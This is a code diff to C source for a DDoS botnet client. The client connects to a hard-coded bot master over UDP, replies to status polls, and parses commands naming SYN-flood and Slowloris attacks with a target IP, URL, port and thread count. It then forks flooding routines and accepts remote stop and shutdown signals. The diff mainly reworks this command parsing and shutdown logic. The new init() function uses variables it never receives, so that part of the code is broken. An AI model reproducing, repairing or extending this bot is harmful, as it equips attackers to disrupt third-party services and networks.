@@ -10,16 +10,19 @@
 
 #define BOT_MASTER "127.0.0.1"
 
+// *****SERIOUS******
+// needs to add a kill switch
+
 int main_sock;
 struct sockaddr_in server;
 int server_size;
 
 // reads from the udp socket which is connected to the master. and closes if it recieves the signal.
-// ****Need to add the close function for the file descriptors for both the fucntions recieving and sending.
 void wait_and_close(int f_write)
 {
 	server_size = sizeof(struct sockaddr_in);
 	char data[12];
+	printf("Waiting for Exit\n");
 	while(1){
 		recvfrom(main_sock, data, 10, 0, (struct sockaddr*)&server, &server_size);
 		if(strstr(data, "UP?") != NULL){
@@ -27,7 +30,8 @@ void wait_and_close(int f_write)
 			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
 		}else if(strstr(data, "[!DDOS!]") != NULL){
 			// Run the exit stuff here
-			fprintf(f_write, "%s", "EXIT");
+			write(f_write, "EXIT", 4);
+			printf("Exit current DDOS recieved\n");
 			close(f_write);
 			connect_to_master(BOT_MASTER, 15551);
 		}
@@ -65,6 +69,8 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 			// closes the output to write to.
 			close(msg_pipe[1]);
 			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
+			//DEBUG
+			printf("Exiting From fork\n");
 			exit(0);
 		}else{
 			// closes the input to recv from.
@@ -93,11 +99,15 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 
 }
 
-void connect_to_master(char *to_con, int port)
+void init()
 {
 	main_sock = make_socket();
 	connect_to(main_sock, to_con, port, &server);
 	printf("\033[0;35m[+] Connected to %s \033[0m\n", to_con);
+}
+
+void connect_to_master(char *to_con, int port)
+{
 	int bytes;
 	char data_recved[80];
 	int type;
@@ -106,9 +116,7 @@ void connect_to_master(char *to_con, int port)
 	char s_port[6];
 	server_size = sizeof(struct sockaddr);
 	while(1){
-		bytes = recvfrom(main_sock, data_recved, 80, 0, (struct sockaddr *)&server, &server_size);
-
-		printf("Bytes: %d\n", bytes);
+		bytes = recvfrom(main_sock, data_recved, 80, 0, (struct sockaddr *)&server, &server_size);		
 
 		if (bytes== ERROR){
 			perror("Unable to recv Data: ");
@@ -120,19 +128,26 @@ void connect_to_master(char *to_con, int port)
 		// DEBUG
 		printf("Data: %s\n", data_recved);
 
-
-		if(strncmp(data_recved, "STARTED", 7) == 0){
+		if(strncmp(data_recved, "[!SHUTDOWN!]", 12) == 0){
+			close(main_sock);
+			printf("Shutdown signal from Master\n");
+			_exit(0);
+		}else if(strncmp(data_recved, "UP?", 3) == 0){
+			// DEBUG
+			printf("Server asked if we are up.\n");
+			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
+		}else if(strncmp(data_recved, "STARTED", 7) == 0){
 			printf("[+] Server is Up and Running\n\tWaiting for server requests");
 		}else if(strncmp(data_recved, "SLOW-LORIS", 10) == 0){
 			type = SLOW_LORIS;
 
-			char *i_of_ip = index(data_recved, (int ) ' ');
+			char *i_of_ip = index(data_recved, (int ) ' ')+1;
 			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
 			strncpy(target_ip, i_of_ip, len_ip);
 			// DEBUG
 			printf("IP: %s|\n", target_ip);
 
-			char *i_of_thrds = index(i_of_ip+len_ip, (int ) ' ');
+			char *i_of_thrds = index(i_of_ip+len_ip, (int ) ' ')+1;
 			int len_thrds = (index(i_of_thrds+1, (int) ' ')) - i_of_thrds;
 			strncpy(thrds, i_of_thrds, len_thrds);
 			// DEBUG
@@ -143,19 +158,21 @@ void connect_to_master(char *to_con, int port)
 		}else if(strncmp(data_recved, "SYN-FLOOD", 9) == 0){
 			type = SYN_FLOOD;
 
-			char *i_of_ip = index(data_recved, (int ) ' ');
+			char *i_of_ip = index(data_recved, (int ) ' ')+1;
 			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
 			strncpy(target_ip, i_of_ip, len_ip);
 			// DEBUG
 			printf("IP: %s|\n", target_ip);
 
-			char *i_of_thrds = index(i_of_ip+len_ip, (int ) ' ');
-			int len_thrds = (index(i_of_thrds+1, (int) ' ')) - i_of_thrds;
+			char *i_of_thrds = i_of_ip+len_ip+1;
+			unsigned char len_thrds = (index(i_of_thrds, (int) ' ')) - i_of_thrds;
 			strncpy(thrds, i_of_thrds, len_thrds);
+			thrds[len_thrds] = 0;
 			// DEBUG
-			printf("Threads: %s|\n", thrds);
+			printf("Threads: %s| len= %d\n", thrds, len_thrds);
 
-			char *i_of_port = rindex(data_recved, (int ) ' ');
+			char *i_of_port = index(i_of_thrds+len_thrds, (int ) ' ')+1;
+			//int len_port = (index(i_of_thrds+1, (int ) ' ')) - i_of_port;
 			strncpy(s_port, i_of_port, 6);
 			// DEBUG
 			printf("port: %s|\n", s_port);
@@ -167,25 +184,25 @@ void connect_to_master(char *to_con, int port)
 
 			char target_url[30];
 
-			char *i_of_ip = index(data_recved, (int ) ' ');
+			char *i_of_ip = index(data_recved, (int ) ' ')+1;
 			int len_ip =  (index(i_of_ip+1, (int ) ' ') - i_of_ip);
 			strncpy(target_ip, i_of_ip, len_ip);
 			// DEBUG
 			printf("IP: %s|\n", target_ip);
 
-			char *i_of_url = index(i_of_ip+len_ip, (int ) ' ');
+			char *i_of_url = index(i_of_ip+len_ip, (int ) ' ')+1;
 			int len_url = (index(i_of_url+1, (int ) ' ') - i_of_url);
 			strncpy(target_url, i_of_url, len_url);
 			// DEBUG
 			printf("URL: %s\n", target_url);
 
-			char *i_of_port = index(i_of_url+len_url, (int )' ');
+			char *i_of_port = index(i_of_url+len_url, (int )' ')+1;
 			int len_port = (index(i_of_port+1, (int) ' ') - i_of_port);
 			strncpy(s_port, i_of_port, len_port);
 			// DEBUG
 			printf("Port for SYN_FLOOD: %s\n", s_port);
 
-			char *i_of_thrds = rindex(data_recved, (int) ' ');
+			char *i_of_thrds = rindex(data_recved, (int) ' ')+1;
 			strncpy(thrds, i_of_thrds, 4);
 			// DEBUG
 			printf("Threads: %s\n", thrds);
@@ -229,9 +246,9 @@ int main(int argc, char const *argv[])
 
 	printf("\033[0;32m[+] Initializing the Bot!\033[0m\n");
 	
+	init();
 	// Change the IP when compiling.
 	connect_to_master(BOT_MASTER, 15551);
 
-	close(main_sock);
 	return 0;
 }
